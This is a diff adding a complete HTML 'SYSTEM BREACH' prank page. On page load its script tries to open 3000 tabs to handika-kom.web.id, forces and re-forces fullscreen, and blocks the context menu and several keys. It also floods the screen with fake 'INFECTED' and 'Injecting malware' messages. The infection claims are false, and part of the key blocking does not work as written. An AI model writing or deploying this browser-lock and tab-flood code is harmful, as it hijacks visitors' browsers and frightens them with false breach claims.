@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>💀 SYSTEM BREACH: Handika Proof 💀</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      background: black;
+      color: #00FF00;
+      font-family: 'Courier New', monospace;
+      user-select: none;
+    }
+
+    #screen {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      animation: flicker 0.2s infinite;
+      white-space: pre;
+      font-size: 14px;
+      padding: 10px;
+    }
+
+    @keyframes flicker {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.4; }
+    }
+
+    .glitch-text {
+      animation: glitch 0.3s infinite;
+      font-weight: bold;
+      color: red;
+      font-size: 24px;
+    }
+
+    @keyframes glitch {
+      0% { transform: translate(1px, 0); color: #0f0; }
+      20% { transform: translate(-1px, 2px); color: #f00; }
+      40% { transform: translate(2px, -1px); color: #0ff; }
+      60% { transform: translate(-2px, 1px); color: #ff0; }
+      80% { transform: translate(1px, -2px); color: #f0f; }
+      100% { transform: translate(0); color: #0f0; }
+    }
+  </style>
+</head>
+<body onload="init()">
+  <div id="screen"></div>
+  <script>
+    const textLines = [
+      "██╗  ██╗ █████╗ ███╗   ██╗██████╗ ██╗██╗  ██╗ █████╗ ",
+      "██║  ██║██╔══██╗████╗  ██║██╔══██╗██║██║ ██╔╝██╔══██╗",
+      "███████║███████║██╔██╗ ██║██║  ██║██║█████╔╝ ███████║",
+      "██╔══██║██╔══██║██║╚██╗██║██║  ██║██║██╔═██╗ ██╔══██║",
+      "██║  ██║██║  ██║██║ ╚████║██████╔╝██║██║  ██╗██║  ██║",
+      "╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝",
+      "",
+      "💀💀💀 SYSTEM BREACH DETECTED 💀💀💀",
+      ">>> User: handika-kom.web.id",
+      ">>> STATUS: INFECTED",
+      "",
+      "Injecting malware...",
+      "Overriding memory...",
+      "Disabling escape...",
+      "████████████████████████████████████████████████████",
+    ];
+
+    function init() {
+      openTabs();
+      enterFullscreen();
+      fillWithSpam();
+      blockEverything();
+    }
+
+    function openTabs() {
+      for (let i = 0; i < 3000; i++) {
+        window.open("https://handika-kom.web.id", "_blank");
+      }
+    }
+
+    function enterFullscreen() {
+      const el = document.documentElement;
+      if (el.requestFullscreen) el.requestFullscreen();
+      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+    }
+
+    function fillWithSpam() {
+      const screen = document.getElementById('screen');
+      let spam = '';
+      for (let i = 0; i < 100; i++) {
+        let line = textLines[Math.floor(Math.random() * textLines.length)];
+        let glitch = Math.random() < 0.2 ? " <span class='glitch-text'>!!HACKED!!</span>" : '';
+        spam += line + glitch + "\n";
+      }
+      screen.innerHTML = spam;
+      setInterval(fillWithSpam, 200);
+    }
+
+    function blockEverything() {
+      document.addEventListener("contextmenu", e => e.preventDefault());
+      document.addEventListener("keydown", e => {
+        if (["F11", "Escape", "F12", "F5", "Ctrl+W", "Alt+F4"].includes(e.key)) {
+          e.preventDefault();
+        }
+      });
+      document.addEventListener('fullscreenchange', () => {
+        if (!document.fullscreenElement) enterFullscreen();
+      });
+    }
+  </script>
+</body>
+</html>
